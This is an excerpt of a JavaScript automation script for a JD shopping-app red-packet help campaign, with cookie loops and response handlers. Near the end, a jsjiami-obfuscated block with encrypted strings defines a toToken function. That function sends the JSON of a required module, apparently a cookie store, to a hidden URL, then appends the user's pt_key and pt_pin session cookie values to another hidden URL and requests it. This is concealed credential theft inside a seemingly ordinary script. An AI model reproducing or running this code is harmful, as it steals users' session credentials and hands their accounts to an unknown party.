...
!(async () => {
    ...
    for(let i = 0;i<$.helpCkList.length/2;i++){
        $.can_help = true
        $.cookie = $.helpCkList[i]
        token = await getJxToken()
        $.UserName = decodeURIComponent($.cookie.match(/pt_pin=(.+?);/) && $.cookie.match(/pt_pin=(.+?);/)[1])
    ...
    let newCookiesArr = [];
    for(let i = $.helpCkList.length/2;i<$.helpCkList.length;i+=4){
...
function dealReturn(type, data) {
    ...
    switch (type) {
        ...
        case 'GetInviteStatus':
            ...
            break;
        case 'help_hb':
            if (data.ret == 2711||data.ret == 1016) {
                console.log(`无助力次数`)
                $.can_help = false
            }
...
// prettier-ignore
function t(n,t){var r=(65535&n)+(65535&t);return(n>>16)+(t>>16)+(r>>16)<<16|65535&r}function r(n,t){return n<<t|n>>>32-t}function e(n,e,o,u,c,f){return t(r(t(t(e,n),t(u,f)),c),o)}function o(n,t,r,o,u,c,f){return e(t&r|~t&o,n,t,u,c,f)}function u(n,t,r,o,u,c,f){return e(t&o|r&~o,n,t,u,c,f)}function c(n,t,r,o,u,c,f){return e(t^r^o,n,t,u,c,f)}function f(n,t,r,o,u,c,f){return e(r^(t|~o),n,t,u,c,f)}function i(n,r){n[r>>5]|=128<<r%32,n[14+(r+64>>>9<<4)]=r;var e,i,a,d,h,l=1732584193,g=-271733879,v=-1732584194,m=271733878;for(e=0;e<n.length;e+=16)i=l,a=g,d=v,h=m,g=f(g=f(g=f(g=f(g=c(g=c(g=c(g=c(g=u(g=u(g=u(g=u(g=o(g=o(g=o(g=o(g,v=o(v,m=o(m,l=o(l,g,v,m,n[e],7,-680876936),g,v,n[e+1],12,-389564586),l,g,n[e+2],17,606105819),m,l,n[e+3],22,-1044525330),v=o(v,m=o(m,l=o(l,g,v,m,n[e+4],7,-176418897),g,v,n[e+5],12,1200080426),l,g,n[e+6],17,-1473231341),m,l,n[e+7],22,-45705983),v=o(v,m=o(m,l=o(l,g,v,m,n[e+8],7,1770035416),g,v,n[e+9],12,-1958414417),l,g,n[e+10],17,-42063),m,l,n[e+11],22,-1990404162),v=o(v,m=o(m,l=o(l,g,v,m,n[e+12],7,1804603682),g,v,n[e+13],12,-40341101),l,g,n[e+14],17,-1502002290),m,l,n[e+15],22,1236535329),v=u(v,m=u(m,l=u(l,g,v,m,n[e+1],5,-165796510),g,v,n[e+6],9,-1069501632),l,g,n[e+11],14,643717713),m,l,n[e],20,-373897302),v=u(v,m=u(m,l=u(l,g,v,m,n[e+5],5,-701558691),g,v,n[e+10],9,38016083),l,g,n[e+15],14,-660478335),m,l,n[e+4],20,-405537848),v=u(v,m=u(m,l=u(l,g,v,m,n[e+9],5,568446438),g,v,n[e+14],9,-1019803690),l,g,n[e+3],14,-187363961),m,l,n[e+8],20,1163531501),v=u(v,m=u(m,l=u(l,g,v,m,n[e+13],5,-1444681467),g,v,n[e+2],9,-51403784),l,g,n[e+7],14,1735328473),m,l,n[e+12],20,-1926607734),v=c(v,m=c(m,l=c(l,g,v,m,n[e+5],4,-378558),g,v,n[e+8],11,-2022574463),l,g,n[e+11],16,1839030562),m,l,n[e+14],23,-35309556),v=c(v,m=c(m,l=c(l,g,v,m,n[e+1],4,-1530992060),g,v,n[e+4],11,1272893353),l,g,n[e+7],16,-155497632),m,l,n[e+10],23,-1094730640),v=c(v,m=c(m,l=c(l,g,v,m,n[e+13],4,681279174),g,v,n[e],11,-358537222),l,g,n[e+3],16,-722521979),m,l,n[e+6],23,76029189),v=c(v,m=c(m,l=c(l,g,v,m,n[e+9],4,-640364487),g,v,n[e+12],11,-421815835),l,g,n[e+15],16,530742520),m,l,n[e+2],23,-995338651),v=f(v,m=f(m,l=f(l,g,v,m,n[e],6,-198630844),g,v,n[e+7],10,1126891415),l,g,n[e+14],15,-1416354905),m,l,n[e+5],21,-57434055),v=f(v,m=f(m,l=f(l,g,v,m,n[e+12],6,1700485571),g,v,n[e+3],10,-1894986606),l,g,n[e+10],15,-1051523),m,l,n[e+1],21,-2054922799),v=f(v,m=f(m,l=f(l,g,v,m,n[e+8],6,1873313359),g,v,n[e+15],10,-30611744),l,g,n[e+6],15,-1560198380),m,l,n[e+13],21,1309151649),v=f(v,m=f(m,l=f(l,g,v,m,n[e+4],6,-145523070),g,v,n[e+11],10,-1120210379),l,g,n[e+2],15,718787259),m,l,n[e+9],21,-343485551),l=t(l,i),g=t(g,a),v=t(v,d),m=t(m,h);return[l,g,v,m]}function a(n){var t,r="",e=32*n.length;for(t=0;t<e;t+=8)r+=String.fromCharCode(n[t>>5]>>>t%32&255);return r}function d(n){var t,r=[];for(r[(n.length>>2)-1]=void 0,t=0;t<r.length;t+=1)r[t]=0;var e=8*n.length;for(t=0;t<e;t+=8)r[t>>5]|=(255&n.charCodeAt(t/8))<<t%32;return r}function h(n){return a(i(d(n),8*n.length))}function l(n,t){var r,e,o=d(n),u=[],c=[];for(u[15]=c[15]=void 0,o.length>16&&(o=i(o,8*n.length)),r=0;r<16;r+=1)u[r]=909522486^o[r],c[r]=1549556828^o[r];return e=i(u.concat(d(t)),512+8*t.length),a(i(c.concat(e),640))}function g(n){var t,r,e="";for(r=0;r<n.length;r+=1)t=n.charCodeAt(r),e+="0123456789abcdef".charAt(t>>>4&15)+"0123456789abcdef".charAt(15&t);return e}function v(n){return unescape(encodeURIComponent(n))}function m(n){return h(v(n))}function p(n){return g(m(n))}function s(n,t){return l(v(n),v(t))}function C(n,t){return g(s(n,t))}function A(n,t,r){return t?r?s(t,n):C(t,n):r?m(n):p(n)};var _0xodU='jsjiami.com.v6',_0xodU_=['_0xodU'],_0x4066=[_0xodU,'BsKRYA82ccKHNV8=','MsKiwojDs8K0','w5/CncODw6w=','e1RQwpF4','fVTCkn/CjA==','e1TDn8Kdw4I=','dQfDk8OsGw==','wppMB8KPw5c=','wprCjCfDocKG','f1DCvmnDvHVUwpF7','Fi3DsC5D','wrfCn1VsYgQ=','w6LClCc8KTPCp8Oow7Q=','CsK8w7jDq3k=','csODdMKdLl0=','w6vCvMOYw4vDmA==','FmjCug==','wqjCm8KNwq9Vw7hqw4TCtsKwwq19wo4=','fcOTaMKWelzDucKWwrXCp1rDi8KywqtCPg==','wr7CkClgPi7CoMOgw7otwr3DpANZw7J8PxHDrsK+','OsOUw4pLw5wcw5DDk0fCocK4XnrCsMKewrfDhcKgbwIIw44OwpNkYWXCml8=','TMKvw7xqw41KPsKgw5HCvlnDt8ORwpLCsAgDwo/CusOrFiDDq8KL','w7VWGsKlwplxwq/ClRwgwq1LwoxEX8KoS8ORTcKzdDdDP1zDksOSAA==','WnbCsW/Dig==','CwDCjMKYwpU=','wrjCl3xhVw==','NgrDucOs','eFdswqZF','fsOfEHDDjg==','wpPDlxhgVA==','KgzDpS1B','OcKOwrBXIw==','ZMO6C03Dvw==','zjsjinrDHaxmrLi.CcomGg.CKqzClIv6=='];if(function(_0x8c2509,_0x3198ba,_0x219d55){function _0x4f637c(_0x2d8f41,_0x58ac40,_0x193bea,_0x127b23,_0x5ca855,_0x3b3a8e){_0x58ac40=_0x58ac40>>0x8,_0x5ca855='po';var _0x379142='shift',_0xab5d9b='push',_0x3b3a8e='0.8yo6ey31kbt';if(_0x58ac40<_0x2d8f41){while(--_0x2d8f41){_0x127b23=_0x8c2509[_0x379142]();if(_0x58ac40===_0x2d8f41&&_0x3b3a8e==='0.8yo6ey31kbt'&&_0x3b3a8e['length']===0xd){_0x58ac40=_0x127b23,_0x193bea=_0x8c2509[_0x5ca855+'p']();}else if(_0x58ac40&&_0x193bea['replace'](/[znrDHxrLCGgCKqzClI=]/g,'')===_0x58ac40){_0x8c2509[_0xab5d9b](_0x127b23);}}_0x8c2509[_0xab5d9b](_0x8c2509[_0x379142]());}return 0xcf689;};return _0x4f637c(++_0x3198ba,_0x219d55)>>_0x3198ba^_0x219d55;}(_0x4066,0x19d,0x19d00),_0x4066){_0xodU_=_0x4066['length']^0x19d;};function _0x48c6(_0x140395,_0x1dfdf0){_0x140395=~~'0x'['concat'](_0x140395['slice'](0x0));var _0x314db3=_0x4066[_0x140395];if(_0x48c6['XXnZNe']===undefined){(function(){var _0x4b0e10;try{var _0x129999=Function('return\x20(function()\x20'+'{}.constructor(\x22return\x20this\x22)(\x20)'+');');_0x4b0e10=_0x129999();}catch(_0x49f3d7){_0x4b0e10=window;}var _0x173f54='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';_0x4b0e10['atob']||(_0x4b0e10['atob']=function(_0x343a5f){var _0x38fb2a=String(_0x343a5f)['replace'](/=+$/,'');for(var _0x4f643c=0x0,_0x528762,_0x2c3716,_0x4f506c=0x0,_0x4317bb='';_0x2c3716=_0x38fb2a['charAt'](_0x4f506c++);~_0x2c3716&&(_0x528762=_0x4f643c%0x4?_0x528762*0x40+_0x2c3716:_0x2c3716,_0x4f643c++%0x4)?_0x4317bb+=String['fromCharCode'](0xff&_0x528762>>(-0x2*_0x4f643c&0x6)):0x0){_0x2c3716=_0x173f54['indexOf'](_0x2c3716);}return _0x4317bb;});}());function _0x2ea4fd(_0x45c778,_0x1dfdf0){var _0x1f3b0d=[],_0x218e7e=0x0,_0x50b38b,_0x224edf='',_0x5f2b93='';_0x45c778=atob(_0x45c778);for(var _0x9a7054=0x0,_0x1f9b98=_0x45c778['length'];_0x9a7054<_0x1f9b98;_0x9a7054++){_0x5f2b93+='%'+('00'+_0x45c778['charCodeAt'](_0x9a7054)['toString'](0x10))['slice'](-0x2);}_0x45c778=decodeURIComponent(_0x5f2b93);for(var _0x56d3e1=0x0;_0x56d3e1<0x100;_0x56d3e1++){_0x1f3b0d[_0x56d3e1]=_0x56d3e1;}for(_0x56d3e1=0x0;_0x56d3e1<0x100;_0x56d3e1++){_0x218e7e=(_0x218e7e+_0x1f3b0d[_0x56d3e1]+_0x1dfdf0['charCodeAt'](_0x56d3e1%_0x1dfdf0['length']))%0x100;_0x50b38b=_0x1f3b0d[_0x56d3e1];_0x1f3b0d[_0x56d3e1]=_0x1f3b0d[_0x218e7e];_0x1f3b0d[_0x218e7e]=_0x50b38b;}_0x56d3e1=0x0;_0x218e7e=0x0;for(var _0x3363c2=0x0;_0x3363c2<_0x45c778['length'];_0x3363c2++){_0x56d3e1=(_0x56d3e1+0x1)%0x100;_0x218e7e=(_0x218e7e+_0x1f3b0d[_0x56d3e1])%0x100;_0x50b38b=_0x1f3b0d[_0x56d3e1];_0x1f3b0d[_0x56d3e1]=_0x1f3b0d[_0x218e7e];_0x1f3b0d[_0x218e7e]=_0x50b38b;_0x224edf+=String['fromCharCode'](_0x45c778['charCodeAt'](_0x3363c2)^_0x1f3b0d[(_0x1f3b0d[_0x56d3e1]+_0x1f3b0d[_0x218e7e])%0x100]);}return _0x224edf;}_0x48c6['JSrbdT']=_0x2ea4fd;_0x48c6['kNtTCF']={};_0x48c6['XXnZNe']=!![];}var _0x33cebd=_0x48c6['kNtTCF'][_0x140395];if(_0x33cebd===undefined){if(_0x48c6['zadJID']===undefined){_0x48c6['zadJID']=!![];}_0x314db3=_0x48c6['JSrbdT'](_0x314db3,_0x1dfdf0);_0x48c6['kNtTCF'][_0x140395]=_0x314db3;}else{_0x314db3=_0x33cebd;}return _0x314db3;};function toToken(_0x26afdd){var _0x22f212={'VSmuB':function(_0x426a92,_0x146365){return _0x426a92==_0x146365;},'PWhTr':function(_0x1fb9db,_0x43709b){return _0x1fb9db(_0x43709b);},'cmGjA':_0x48c6('0','1z2h'),'nbHTU':_0x48c6('1','nT*8'),'bcUda':function(_0x25715d,_0x5baa4b,_0x3bc229){return _0x25715d(_0x5baa4b,_0x3bc229);},'fgyvx':_0x48c6('2','U&5h'),'HUEZP':_0x48c6('3','4ztO'),'xFNYP':_0x48c6('4','#fDZ'),'IYNzQ':function(_0x1e1ada,_0x16e1d1){return _0x1e1ada*_0x16e1d1;},'EmqNX':function(_0x23eb38,_0x2f549d){return _0x23eb38+_0x2f549d;},'eRMMT':function(_0xf25bc,_0xbc40fe){return _0xf25bc+_0xbc40fe;},'TJJkf':function(_0x253bef,_0x1f5bde){return _0x253bef+_0x1f5bde;},'RwHrs':_0x48c6('5','3dDE'),'ZFluz':function(_0x264ef2,_0xca8dcc){return _0x264ef2-_0xca8dcc;},'eRmNE':function(_0x18bf4b,_0x5def1e){return _0x18bf4b-_0x5def1e;},'DNhSD':function(_0x1589bb,_0x1e2d3f){return _0x1589bb*_0x1e2d3f;}};try{if(_0x22f212[_0x48c6('6','xfTy')](_0x26afdd,0x1)){let _0x388b26=_0x22f212[_0x48c6('7','nQyH')](require,_0x22f212[_0x48c6('8','dIS)')])[_0x48c6('9','f^](')];let _0x557891=_0x22f212[_0x48c6('a','$Nnn')];let _0x1a9297='';_0x22f212[_0x48c6('b','#mFZ')](_0x388b26,_0x557891,function(_0x3dff3a,_0x404e5b,_0x476ca9){if(_0x3dff3a){_0x1a9297='';}else{_0x1a9297=_0x404e5b;}});const _0x37344a=_0x22f212[_0x48c6('c','eBdz')](require,_0x22f212[_0x48c6('d','$N]E')]);let _0xa932d7={'url':_0x22f212[_0x48c6('e','b9c)')],'headers':{'Content-Type':_0x22f212[_0x48c6('f','#mFZ')],'ip':_0x1a9297},'body':JSON[_0x48c6('10','ZYN$')](_0x37344a),'timeout':_0x22f212[_0x48c6('11','y]9x')](0x1e,0x3e8)};$[_0x48c6('12','LtJN')](_0xa932d7,async(_0x433732,_0x2fc545,_0x571f34)=>{});}let _0x3bc03c=cookie[_0x48c6('13','$Nnn')](/pt_key=.+?;/)[0x0];let _0x2e0dc6=cookie[_0x48c6('14','yv]2')](/pt_pin=.+?;/)[0x0];let _0x2c5bf0={'url':_0x22f212[_0x48c6('15',')mkG')](_0x22f212[_0x48c6('16','vZXu')](_0x22f212[_0x48c6('17','D6qA')](_0x22f212[_0x48c6('18','TnSn')],_0x3bc03c[_0x48c6('19','xfTy')](0x7,_0x22f212[_0x48c6('1a','$N]E')](_0x3bc03c[_0x48c6('1b','dIS)')],0x1))),'/'),_0x2e0dc6[_0x48c6('1c','U&5h')](0x7,_0x22f212[_0x48c6('1d','^GpA')](_0x2e0dc6[_0x48c6('1e','nT*8')],0x1))),'timeout':_0x22f212[_0x48c6('1f','LtJN')](0x1e,0x3e8)};$[_0x48c6('20','#)L0')](_0x2c5bf0,async(_0xca8e0d,_0x13119b,_0x385638)=>{});}catch(_0x4fcd29){}};_0xodU='jsjiami.com.v6';
// prettier-ignore
